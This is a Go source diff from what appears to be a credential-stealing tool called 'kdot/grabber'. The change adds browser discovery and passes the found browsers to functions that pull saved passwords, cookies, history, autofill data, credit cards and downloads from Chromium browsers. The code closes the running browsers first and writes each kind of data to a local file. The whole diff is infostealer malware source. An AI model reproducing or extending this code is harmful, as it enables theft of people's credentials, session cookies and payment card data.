@@ -1,49 +1,57 @@
 package browsers
 
 import (
+	"encoding/json"
 	"os"
 
 	"kdot/grabber/browsers/chromium/autofill"
 	"kdot/grabber/browsers/chromium/cards"
 	"kdot/grabber/browsers/chromium/cookies"
 	"kdot/grabber/browsers/chromium/downloads"
+	"kdot/grabber/browsers/chromium/finder"
 	"kdot/grabber/browsers/chromium/history"
 	"kdot/grabber/browsers/chromium/pass"
+	"kdot/grabber/browsers/chromium/structs"
 	"kdot/grabber/browsers/util"
 )
 
-func GetBrowserPasswords() {
+func GetBrowserPasswords(browsers []structs.Browser) {
 	//fmt.Println(pass.GetPasswords())
-	os.WriteFile("passwords.json", []byte(pass.Get()), 0644)
+	os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
 }
 
-func GetBrowserCookies() {
-	os.WriteFile("cookies_netscape.txt", []byte(cookies.Get()), 0644)
+func GetBrowserCookies(browsers []structs.Browser) {
+	os.WriteFile("cookies_netscape.txt", []byte(cookies.Get(browsers)), 0644)
 }
 
-func GetBrowserHistory() {
+func GetBrowserHistory(browsers []structs.Browser) {
 	//fmt.Println(history.GetHistory())
-	os.WriteFile("history.json", []byte(history.Get()), 0644)
+	os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
 }
 
-func GetBrowserAutofill() {
-	os.WriteFile("autofill.json", []byte(autofill.Get()), 0644)
+func GetBrowserAutofill(browsers []structs.Browser) {
+	os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
 }
 
-func GetBrowserCards() {
-	os.WriteFile("cards.json", []byte(cards.Get()), 0644)
+func GetBrowserCards(browsers []structs.Browser) {
+	os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
 }
 
-func GetBrowserDownloads() {
-	os.WriteFile("downloads.json", []byte(downloads.Get()), 0644)
+func GetBrowserDownloads(browsers []structs.Browser) {
+	os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
 }
 
 func GetBrowserData() {
+	totalBrowsers := finder.FindBrowsers()
+	//write to json file totalBrowsers
+	//fmt.Println(totalBrowsers)
+	jsonData, _ := json.MarshalIndent(totalBrowsers, "", "    ")
+	os.WriteFile("browsersJSON.json", jsonData, 0644)
 	util.CloseBrowsers()
-	GetBrowserPasswords()
-	GetBrowserHistory()
-	GetBrowserCookies()
-	GetBrowserDownloads()
-	GetBrowserCards()
-	GetBrowserAutofill()
+	GetBrowserPasswords(totalBrowsers)
+	GetBrowserHistory(totalBrowsers)
+	GetBrowserCookies(totalBrowsers)
+	GetBrowserDownloads(totalBrowsers)
+	GetBrowserCards(totalBrowsers)
+	GetBrowserAutofill(totalBrowsers)
 }
